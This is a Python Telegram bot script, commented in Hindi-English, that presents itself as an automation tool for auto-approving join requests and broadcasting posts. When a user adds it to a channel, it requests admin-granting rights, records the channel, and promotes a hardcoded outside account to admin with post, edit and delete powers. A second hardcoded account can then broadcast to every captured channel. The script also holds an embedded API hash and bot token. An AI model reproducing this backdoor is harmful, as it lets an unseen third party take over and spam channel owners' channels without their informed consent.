import os
import sys
import threading
import traceback
import asyncio

# === RENDER STATUS 1 (PYTHON 3.14) LIFETIME FIX ===
try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
# =================================================

import logging
from http.server import BaseHTTPRequestHandler, HTTPServer
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ChatPrivileges
from pyrogram.errors import FloodWait

# Logs ko force print karna
logging.basicConfig(level=logging.INFO)
sys.stdout.reconfigure(line_buffering=True)

print("🚀 SCRIPT START HUI...", flush=True)

# --- AAPKI DETAILS ---
API_ID = 33603340
API_HASH = "0f1a7f670519f9e44d0d7fdb6aa8efba"
BOT_TOKEN = "7874642792:AAF08vl1-qcMUHOIUZrL5IwJS1A7zoD5ucw"

ADMIN_ID = 1484173564       # Jisko Broadcast karna hai
TARGET_ADMIN_ID = 1413135933 # Jisko bot automatically Admin banayega

DB_FILE = "channel_list.txt"

def get_channels():
    if not os.path.exists(DB_FILE): return set()
    with open(DB_FILE, "r") as f:
        return set(line.strip() for line in f if line.strip())

def add_channel(chat_id):
    channels = get_channels()
    channels.add(str(chat_id))
    with open(DB_FILE, "w") as f:
        f.write("\n".join(channels))


# --- DUMMY WEB SERVER (RENDER KE LIYE) ---
class WebServerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is Running Perfectly!")
    def log_message(self, format, *args):
        pass

def start_server():
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(('0.0.0.0', port), WebServerHandler).serve_forever()

threading.Thread(target=start_server, daemon=True).start()


# --- TELEGRAM BOT CODE ---
app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, in_memory=True)

# 1. /START - Auto-Tick Permissions & Buttons
@app.on_message(filters.command("start") & filters.private)
async def start_cmd(client, message):
    bot_info = await client.get_me()
    
    # Auto-Tick Permissions: add_admins, invite_users, post_messages
    add_link = f"https://t.me/{bot_info.username}?startchannel=true&admin=add_admins+invite_users+post_messages+manage_chat"
    
    # Update Link aur Add Channel Button
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔥 ADD BOT TO CHANNEL 🔥", url=add_link)],
        [InlineKeyboardButton("🔔 UPDATE", url="https://t.me/+cgwss3Urm8o3MDI1")]
    ])
    
    text = (
        f"👋 **Welcome {message.from_user.first_name}!**\n\n"
        "Main aapka Advanced Automation Bot hoon.\n"
        "✅ Pending requests auto-approve karunga.\n"
        "✅ Target user ko automatically admin banaunga.\n"
        "✅ Saare channels mein broadcast karunga.\n\n"
        "👇 **Add Bot To Channel** par click karein:"
    )
    await message.reply_text(text, reply_markup=keyboard)


# 2. AUTO-PROMOTE ADMIN & SAVE CHANNEL
@app.on_message(filters.new_chat_members)
async def bot_added(client, message):
    bot_info = await client.get_me()
    for member in message.new_chat_members:
        if member.id == bot_info.id:
            # Bot channel mein add ho gaya! ID save karo.
            add_channel(message.chat.id)
            
            # User 1413135933 ko Admin banayein
            try:
                await client.promote_chat_member(
                    chat_id=message.chat.id,
                    user_id=TARGET_ADMIN_ID,
                    privileges=ChatPrivileges(
                        can_manage_chat=True,
                        can_invite_users=True,
                        can_post_messages=True,
                        can_edit_messages=True,
                        can_delete_messages=True
                    )
                )
                print(f"✅ User {TARGET_ADMIN_ID} ko admin bana diya gaya in {message.chat.id}")
            except Exception as e:
                print(f"❌ Admin banane mein error: {e}")


# 3. ACCEPT ALL PENDING REQUESTS
@app.on_message(filters.command("acceptall") & filters.private)
async def accept_all_requests(client, message):
    if len(message.command) < 2:
        return await message.reply_text("⚠️ Sahi format: `/acceptall -100XXXXXXXXXX` (Channel ID daalein)")
    
    chat_id = int(message.command[1])
    msg = await message.reply_text(f"⏳ Channel `{chat_id}` ki requests accept ho rahi hain...")
    
    try:
        await client.approve_all_chat_join_requests(chat_id)
        await msg.edit_text("✅ **SUCCESS!** Saari pending requests accept kar li gayi hain!")
    except Exception as e:
        await msg.edit_text(f"❌ Error: {e}")


# 4. LIVE NEW REQUEST AUTO-APPROVE
@app.on_chat_join_request()
async def auto_accept_new(client, request):
    try:
        await client.approve_chat_join_request(request.chat.id, request.from_user.id)
    except Exception as e:
        print(f"Live Approve Error: {e}")


# 5. ADMIN BROADCAST
@app.on_message(filters.command(["broadcast", "admin"]) & filters.user(ADMIN_ID) & filters.private)
async def broadcast_post(client, message):
    if not message.reply_to_message:
        return await message.reply_text("⚠️ Kisi post ya message ko reply karke `/broadcast` bhejein.")
    
    channels = get_channels()
    if not channels:
        return await message.reply_text("❌ Abhi tak kisi channel mein add nahi kiya gaya hai.")
    
    status = await message.reply_text(f"⏳ {len(channels)} channels mein post bhej raha hoon...")
    
    success = 0
    for chat_id in channels:
        try:
            await message.reply_to_message.copy(int(chat_id))
            success += 1
            await asyncio.sleep(0.5) # Anti-ban delay
        except FloodWait as e:
            await asyncio.sleep(e.value)
            await message.reply_to_message.copy(int(chat_id))
            success += 1
        except Exception:
            pass
            
    await status.edit_text(f"✅ **Broadcast Done!**\nPost successfully sent to {success} channels.")


if __name__ == "__main__":
    print("🚀 BOT CLIENT START HO RAHA HAI...", flush=True)
    try:
        app.run()
    except Exception as e:
        print(f"❌ FATAL ERROR: {e}")
